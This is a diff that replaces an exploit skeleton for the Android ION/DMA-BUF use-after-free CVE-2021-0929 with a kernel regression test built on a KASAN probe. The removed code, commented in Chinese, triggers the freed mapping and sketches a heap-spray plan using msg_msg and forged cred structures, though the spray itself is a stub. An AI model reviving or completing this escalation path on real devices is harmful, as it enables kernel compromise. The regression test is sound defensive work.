@@ -1,95 +1,79 @@
-// cve_2021_0929_backend.cpp (概念框架)
-#include <chrono>
+// SPDX-License-Identifier: GPL-2.0
+// Minimal guest-side ION driver and DMA-BUF regression controller.
+#include <errno.h>
 #include <fcntl.h>
-#include <format>
-#include <iostream>
-#include <linux/dma-buf.h>
-#include <linux/ion.h>
-#include <string>
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
 #include <sys/ioctl.h>
 #include <unistd.h>
 
-void log(const std::string& msg)
+#include "../../../tools/ion-kasan-test/ion_probe_uapi.h"
+
+struct ion_allocation_data {
+	uint64_t len;
+	uint32_t heap_id_mask;
+	uint32_t flags;
+	uint32_t fd;
+	uint32_t unused;
+};
+
+struct dma_buf_sync {
+	uint64_t flags;
+};
+
+#define ION_IOC_MAGIC 'I'
+#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
+#define DMA_BUF_IOCTL_SYNC _IOW('b', 0, struct dma_buf_sync)
+#define DMA_BUF_SYNC_RW 3U
+#define DMA_BUF_SYNC_END (1U << 2)
+
+static int fail(const char *step)
 {
-    auto now = std::chrono::zoned_time { std::chrono::current_zone(), std::chrono::system_clock::now() };
-    std::cout << std::format("[{:%Y-%m-%dT%H:%M:%S%z}] [DEBUG] %s\n", now, msg);
+	fprintf(stderr, "ION_TEST_FAIL step=%s errno=%d (%s)\n", step, errno,
+		strerror(errno));
+	return 1;
 }
 
-class CVE20210929Backend {
-public:
-    bool setup()
-    {
-        // 1. 打开 ION 设备
-        ion_fd_ = open("/dev/ion", O_RDONLY);
-        if (ion_fd_ < 0)
-            return false;
+int main(void)
+{
+	struct ion_allocation_data allocation = {
+		.len = 4096,
+		.heap_id_mask = 1U << 0, /* ION_HEAP_TYPE_SYSTEM */
+	};
+	struct dma_buf_sync sync = { .flags = DMA_BUF_SYNC_RW | DMA_BUF_SYNC_END };
+	int ion_fd;
+	int probe_fd;
+	int buf_fd;
 
-        // 2. 分配 ION 缓冲区
-        struct ion_allocation_data alloc_data = {
-            .len = 0x1000,
-            .align = 0x1000,
-            .heap_id_mask = ION_HEAP_TYPE_SYSTEM,
-            .flags = 0,
-        };
-        if (ioctl(ion_fd_, ION_IOC_ALLOC, &alloc_data) < 0)
-            return false;
-        handle_ = alloc_data.handle;
+	ion_fd = open("/dev/ion", O_RDWR | O_CLOEXEC);
+	if (ion_fd < 0)
+		return fail("open_real_dev_ion");
+	if (ioctl(ion_fd, ION_IOC_ALLOC, &allocation) < 0)
+		return fail("ION_IOC_ALLOC_system_heap");
+	buf_fd = (int)allocation.fd;
+	printf("ION_ALLOC_OK fd=%d len=%llu heap_mask=0x%x\n", buf_fd,
+	       (unsigned long long)allocation.len, allocation.heap_id_mask);
 
-        // 3. 导出为 DMA-BUF fd
-        struct ion_fd_data fd_data = { .handle = handle_ };
-        if (ioctl(ion_fd_, ION_IOC_SHARE, &fd_data) < 0)
-            return false;
-        dma_buf_fd_ = fd_data.fd;
-        return true;
-    }
+	probe_fd = open("/dev/ion_kasan_probe", O_RDWR | O_CLOEXEC);
+	if (probe_fd < 0)
+		return fail("open_probe");
+	if (ioctl(probe_fd, ION_PROBE_HOLD, &buf_fd) < 0)
+		return fail("probe_hold_kmap");
+	printf("ION_PROBE_HOLD_OK\n");
 
-    bool trigger()
-    {
-        // 关键步骤：制造 UAF
-        // 4. 通过 DMA_BUF_IOCTL_SYNC 触发 end_cpu_access，导致内部 kunmap
-        struct dma_buf_sync sync_end = { .flags = DMA_BUF_SYNC_END };
-        if (ioctl(dma_buf_fd_, DMA_BUF_IOCTL_SYNC, &sync_end) < 0) {
-            // 在某些内核上，如果计数器未归零，此操作可能失败
-            // 但漏洞场景下，这正是悬空指针产生的位置
-        }
+	if (ioctl(buf_fd, DMA_BUF_IOCTL_SYNC, &sync) < 0)
+		return fail("DMA_BUF_SYNC_END");
+	printf("ION_SYNC_END_OK\n");
 
-        // 5. (可选) 释放 ion handle，进一步触发清理，但保持 dma_buf_fd 打开
-        // ioctl(ion_fd_, ION_IOC_FREE, &alloc_data);
+	if (ioctl(probe_fd, ION_PROBE_TOUCH) < 0)
+		return fail("probe_touch_after_sync_end");
+	printf("ION_TEST_PASS mapping_survived_sync_end\n");
 
-        // 此时，底层 buffer 可能已被解映射，但其他内核驱动仍持有引用
-        return true;
-    }
-
-    // 此函数负责在 UAF 窗口期进行 Heap Spray
-    bool reclaim_and_escalate()
-    {
-        // Heap Spray 策略：
-        // 1. 使用 sendmsg/msgsnd 等系统调用，在已释放的内存地址上
-        //    喷射精心构造的数据（例如伪造的函数指针、cred 结构体等）。
-        // 2. 触发一个对已污染对象的操作，实现控制流劫持或数据篡改。
-
-        // 示例：喷射大量“A”到可能的 UAF 地址
-        const size_t spray_size = 0x10000;
-        char* spray_buf = (char*)malloc(spray_size);
-        log(std::format("Perform example exploit with HeapSpary, output %d bytes to %p.\n", spray_size, spray_buf));
-        memset(spray_buf, 0x41, spray_size);
-        // 通过某种内核接口（如 msg_msg）喷射数据...
-        return true;
-    }
-
-    void cleanup()
-    {
-        if (dma_buf_fd_ > 0)
-            close(dma_buf_fd_);
-        if (ion_fd_ > 0) {
-            // struct ion_handle_data free_data = { .handle = handle_ };
-            // ioctl(ion_fd_, ION_IOC_FREE, &free_data);
-            close(ion_fd_);
-        }
-    }
-
-private:
-    int ion_fd_ = -1;
-    int dma_buf_fd_ = -1;
-    ion_user_handle_t handle_ = 0;
-};
+	if (ioctl(probe_fd, ION_PROBE_RELEASE) < 0)
+		return fail("probe_release");
+	close(probe_fd);
+	close(buf_fd);
+	close(ion_fd);
+	return 0;
+}
